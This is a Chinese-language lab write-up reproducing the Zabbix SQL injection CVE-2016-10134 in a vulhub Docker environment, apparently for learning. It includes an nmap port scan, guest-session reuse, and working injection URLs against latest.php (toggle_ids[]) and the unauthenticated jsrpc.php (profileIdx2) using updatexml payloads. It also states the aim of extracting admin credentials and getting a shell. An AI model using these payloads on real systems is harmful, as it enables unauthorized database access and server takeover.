## **漏洞分析**　

zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。Zabbix 的latest.php中的toggle\_ids\[\]或jsrpc.php中的profieldx2参数存在sql注入，通过sql注入获取管理员账户密码，进入后台，进行getshell操作。

## **漏洞原理**

![](../Images/a7f0581a3835345fe57da567f1f661ee.png)

## **影响版本**

  

3.03之前的版本

  

## **复现机器版本**

  
攻击机：ubuntu18.04  
靶机：ubuntu18.04 Docker version 20.10.10

  

## **漏洞复现**

  
准备阶段  
进入靶场-->启动服务

  

`cd ~/vulhub/zabbix/CVE-2016-10134`

`docker-compose up -d`

  

![](../Images/7bee7922e277b127fa584853c6313fa8.png)

  

搭建成功

访问地址：http://localhost:8080/

  

![](../Images/f414540aecaf15fee3eff38c7ad59834.png)

  

  
信息收集  

使用nmap工具进行对网站服务的端口扫描

`nmap -sS -v -p- 192.168.20.137`

  

![](../Images/f24fb821deeb34f9d821633061a3e6e5.png)

  

可以看到打开了8080登陆界面端口

  

  
漏洞利用

  

用账号guest（密码为空）登录游客账户

  

![](../Images/a1463f9d4a40d2fa2fd309cb8fae3915.png)

  

在Cookie拿到zbx\_sessionid的sessionid,复制后16位字符：c501d37f5badc79d

  

![](../Images/febd3604c853f997d01d3548eda2c6b7.png)

  

将这16个字符作为sessionid的值，访问

  

```
http://192.168.20.137:8080/latest.php?output=ajax&sid= c501d37f5badc79d&favobj=toggle&toggle\_open\_state=1&toggle\_ids\[\]=updatexml(0,concat(0xa,user()),0)
```

  

可见成功注入

  

![](../Images/4f2a231f39cac8473a54d4e3a582b0a3.png)

然后在jsrpc.php中尝试且无需登录：

  

```
http://192.168.20.137:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)
```

![](../Images/c0363a859015578a0bc2f619af408a79.png)

  
最后关闭容器

`docker-compose down`
